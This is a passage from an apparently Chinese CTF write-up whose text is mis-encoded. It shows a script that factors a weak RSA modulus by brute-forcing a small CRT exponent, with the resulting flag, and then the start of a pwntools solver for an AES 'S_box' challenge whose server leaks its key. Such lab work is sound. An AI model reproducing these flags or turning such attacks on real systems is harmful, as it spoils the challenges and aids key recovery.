</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">gcd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ====== å¡«å…¥é¢˜ç›®ç»™çš„ n å’Œ e ======</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">59802493250926859707985963604065644706006753432029457979480870189591634515944547801582044132550574140049396756158974108666587177618882259807156459782125677704143102175791607852135852403246382056816004306499712131698646815738798243056590111291799398438023345030391834782966046976995917844819454047154287312391</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">55212884840887233646138079973875295799093171847359460085387084716906818593689341421818829383370282800231404248386041253598996862719171485530961860941585382910224531768283026267484780257269526617362183903996384696040145787076592207619279689647074176697837752679360230601598541884491676076657287130000027117241</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BITS</span> <span class="o">=</span> <span class="mi">20</span>  <span class="c1"># å›ºå®š</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ====== é€‰å–æ¨¡ n ä¸‹éšæœºåŸºåº• ======</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">A</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">inv_a</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Using base a =&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ====== æš´åŠ› d_pï¼Œå¯»æ‰¾ gcd(a^(e*dp - 1) - 1, n) ======</span>
</span></span><span class="line"><span class="cl"><span class="n">limit</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">BITS</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">dp</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">limit</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">X</span> <span class="o">=</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">dp</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">*</span> <span class="n">inv_a</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl">    <span class="n">g</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">X</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">g</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">g</span>
</span></span><span class="line"><span class="cl">        <span class="n">q</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">g</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Found p =&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Found q =&#34;</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">S</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="n">q</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;SYC{&#34;</span> <span class="o">+</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">S</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] p + q =&#34;</span><span class="p">,</span> <span class="n">S</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] FLAG =&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€å¥½åœ¨Liunxä¸‹è¿è¡Œè„šæœ¬ï¼Œä¼šå¿«ä¸€ç‚¹</p>
<p>SYC{644684707c540998d760975fb98a816a469ec567abe5c8004164d3ce887c6a8e}</p>
<h3 id="34s_box">34.S_box
</h3><h5 id="æ ¸å¿ƒé€»è¾‘æ‹†è§£">æ ¸å¿ƒé€»è¾‘æ‹†è§£
</h5><ol>
<li>
<p>å…³é”®ä¿¡æ¯æå–</p>
<p>ï¼šæœåŠ¡å™¨äº¤äº’æ—¶ç›´æ¥å‘é€ 3 ä¸ªæ ¸å¿ƒå‚æ•°ï¼ˆæ— ä»»ä½•éšè—ï¼‰ï¼š</p>
<ul>
<li>AES å¯†é’¥ï¼š<code>key1</code>ï¼ˆ128 ä½æ•´æ•°ï¼Œå¯ç›´æ¥è½¬å­—èŠ‚æ•°ç»„ï¼‰</li>
<li>AES å¯†æ–‡ï¼š<code>Cipher</code>ï¼ˆflag çš„åŠ å¯†ç»“æœï¼‰</li>
<li>CBC æ¨¡å¼å‘é‡ï¼š<code>IV</code>ï¼ˆ16 å­—èŠ‚éšæœºå€¼ï¼‰</li>
</ul>
</li>
<li>
<p><strong>AES è§£å¯†æ¡ä»¶æ»¡è¶³</strong>ï¼šAES-CBC è§£å¯†ä»…éœ€ã€Œå¯†é’¥ + IV + å¯†æ–‡ã€ï¼Œä¸‰è€…å‡å·²å…¬å¼€ï¼Œæ— éœ€ä¾èµ–è‡ªå®šä¹‰åŠ å¯†å‡½æ•°æˆ–äº¤äº’åŠŸèƒ½ã€‚</p>
</li>
<li>
<p>ç›´æ¥è§£å¯†æ“ä½œ</p>
<p>ï¼š</p>
<ul>
<li>å°†<code>key1</code>ï¼ˆæ•´æ•°ï¼‰è½¬å­—èŠ‚æ•°ç»„ï¼ˆ<code>long_to_bytes(key1)</code>ï¼‰ä½œä¸º AES å¯†é’¥ï¼›</li>
<li>ç”¨ AES-CBC æ¨¡å¼è§£å¯†<code>Cipher</code>ï¼›</li>
<li>å¯¹è§£å¯†ç»“æœæ‰§è¡Œ PKCS7 å»å¡«å……ï¼ˆ<code>unpad</code>ï¼‰ï¼Œå¾—åˆ°åŸå§‹ flagã€‚</li>
</ul>
</li>
</ol>
<h5 id="å…³é”®">å…³é”®
</h5><p>è‡ªå®šä¹‰åŠ å¯†å‡½ï¼ˆ<code>Encrypt</code>ï¼‰å’Œ 16 ä½äº¤äº’æ¬¡æ•°æ˜¯å¹²æ‰°é¡¹ï¼Œæ ¸å¿ƒçŸ›ç›¾å·²é€šè¿‡æœåŠ¡å™¨æ³„éœ²çš„ AES å¯†é’¥ç›´æ¥è§£å†³ï¼Œæ— éœ€åˆ†æ S ç›’ã€ç½®æ¢ç­‰å¤æ‚é€»è¾‘ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------------- AES å¸¸é‡ ----------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">Sbox</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 0     1      2      3      4      5      6      7      8      9      A      B      C      D      E      F</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">InvSbox</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">InvSbox</span><span class="p">[</span><span class="n">Sbox</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="o">=</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Rcon</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x1b</span><span class="p">,</span><span class="mh">0x36</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------------- AES å·¥å…·å‡½æ•° ----------------------</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sub_word</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">Sbox</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">word</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rot_word</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">word</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> <span class="o">+</span> <span class="n">word</span><span class="p">[:</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">expand_key</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_symbols</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_symbols</span><span class="p">)</span> <span class="o">==</span> <span class="mi">16</span>
